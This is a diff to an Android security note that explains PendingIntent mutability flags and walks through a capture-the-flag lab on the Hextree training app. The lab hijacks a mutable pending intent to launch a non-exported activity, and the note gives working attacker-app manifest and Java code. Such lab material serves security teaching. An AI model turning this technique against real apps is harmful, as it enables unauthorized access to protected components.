@@ -86,9 +86,22 @@ theKeyFromAppA.send();
 5. The System now executes that Intent with the identity and permissions of App A.
 6. Since App A is perfectly allowed to launch its own non-exported activity, the launch succeeds
 
-# Vulnerabilities
+---
 
-## Share a mutable pending
+## Mutability
+
+PendingIntents refers to whether the contents of a `PendingIntent` can be modified after it has been created.
+
+Starting from Android 12 (API level 31), Android requires developers to explicitly declare whether a `PendingIntent` is mutable or immutable \[[↗](https://developer.android.com/guide/components/intents-filters#DeclareMutabilityPendingIntent)] by setting one of these flags:
+
+* `PendingIntent.FLAG_IMMUTABLE`
+* `PendingIntent.FLAG_MUTABLE`
+
+---
+
+## Vulnerabilities
+
+### Share a mutable pending
 
 Let's say that the app `io.hextree.attacksurface` has the following activity:
 
@@ -166,3 +179,85 @@ String flag = intent.getStringExtra("flag");
 Log.d("Flag", String.valueOf(flag));
 ```
 
+### Hijack a pending intent
+
+Let's say that the app `io.hextree.attacksurface` has the following activity:
+
+```xml
+<activity
+    android:name="io.hextree.attacksurface.activities.Flag23Activity"
+    android:exported="false">
+    <intent-filter>
+        <action android:name="io.hextree.attacksurface.MUTATE_ME"/>
+        <category android:name="android.intent.category.DEFAULT"/>
+    </intent-filter>
+</activity>
+```
+
+```java
+public class Flag23Activity extends AppCompactActivity {
+    public Flag23Activity() {...}
+
+    @Override
+    protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        Intent intent = getIntent();
+        String action = intent.getAction();
+        if (action == null) {
+            Toast.makeText(this, "Sending implicit intent with the flag\nio.hextree.attacksurface.MUTATE_ME", 1).show();
+            Intent intent2 = new Intent("io.hextree.attacksurface.GIVE_FLAG");
+            intent2.setClassName(getPackageName(), Flag23Activity.class.getCanonicalName());
+            PendingIntent activity = PendingIntent.getActivity(getApplicationContext(), 0, intent2, 33554432);
+            Intent intent3 = new Intent("io.hextree.attacksurface.MUTATE_ME");
+            intent3.addFlags(8);
+            intent3.putExtra("pending_intent", activity);
+            startActivity(intent3);
+            return;
+        }
+        if (action.equals("io.hextree.attacksurface.GIVE_FLAG")) {
+            if (intent.getIntExtra("code", -1) == 42) {
+                success(this);
+            } else {
+                Toast.makeText(this, "Condition not met for flag", 0).show();
+            }
+        }
+    }
+}
+```
+
+To obtain this flag, we need to send an intent with the action `io.hextree.attacksurface.GIVE_FLAG`. However, due to `android:exported="false"`, we cannot send this type of intent directly.
+
+On first launch, we can see that the app sends an implicit intent called `MUTATE_ME`, which contains a `PendingIntent` to call itself back with `GIVE_FLAG`. Therefore, we simply need to register `MUTATE_ME`, retrieve the `PendingIntent` and execute it.
+
+There's just one more problem: to get the flag, we need to add an extra `code` call with a value of 42. According to the [Google documentation](https://developer.android.com/reference/android/app/PendingIntent#FLAG_MUTABLE), the value `33554432` corresponds to `FLAG_MUTABLE`, which allows us to modify the intent.
+
+```xml
+<activity
+    android:name=".MainActivity"
+    android:exported="true">
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+    </intent-filter>
+    <intent-filter>
+        <action android:name="io.hextree.attacksurface.MUTATE_ME" />
+        <category android:name="android.intent.category.DEFAULT" />
+    </intent-filter>
+</activity>
+```
+
+```java
+Intent intent = getIntent();
+if (intent != null) {
+    PendingIntent pendingIntent = intent.getParcelableExtra("pending_intent");
+    if (pendingIntent != null) {
+        Intent intent2 = new Intent();
+        intent2.putExtra("code", 42);
+        try {
+            pendingIntent.send(this, 0, intent2);
+        } catch (PendingIntent.CanceledException e) {
+            throw new RuntimeException(e);
+        }
+    }
+}
+```
